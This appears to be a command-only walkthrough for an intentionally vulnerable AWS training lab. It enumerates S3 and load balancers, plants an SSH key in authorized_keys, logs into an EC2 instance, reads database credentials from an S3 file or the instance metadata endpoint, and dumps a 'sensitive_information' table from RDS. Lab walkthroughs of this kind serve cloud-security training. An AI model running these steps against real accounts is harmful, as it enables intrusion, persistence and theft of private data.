`aws configure --profile Lara`

`aws s3 ls --profile Lara`

`aws s3 ls s3://<bucket> --recursive --profile Lara`

`aws s3 cp s3://<bucket>/cg-lb-logs/AWSLogs/793950739751/elasticloadbalancing/us-east-1/2019/06/19/555555555555_elasticloadbalancing_us-east-1_app.cg-lb-cgidp347lhz47g.d36d4f13b73c2fe7_20190618T2140Z_10.10.10.100_5m9btchz.log . --profile Lara`

`cat 555555555555_elasticloadbalancing_us-east-1_app.cg-lb-cgidp347lhz47g.d36d4f13b73c2fe7_20190618T2140Z_10.10.10.100_5m9btchz.log`

`aws elbv2 describe-load-balancers --profile Lara`

`echo "public ssh key" >> /home/ubuntu/.ssh/authorized_keys`

`curl ifconfig.me`

`ssh -i private_key ubuntu@public.ip.of.ec2`

# BRANCH A:

`sudo apt-get install awscli`

`aws s3 ls`

`aws s3 ls s3://<bucket> --recursive`

`aws s3 cp s3://<bucket>/db.txt .`

`cat db.txt`

`aws rds describe-db-instances --region us-east-1`

`psql postgresql://<db_user>:<db_password>@<rds-instance>:5432/<db_name>`

`\dt`

`select * from sensitive_information;`

# BRANCH B:

`curl http://169.254.169.254/latest/user-data`

`psql postgresql://<db_user>:<db_password>@<rds-instance>:5432/<db_name>`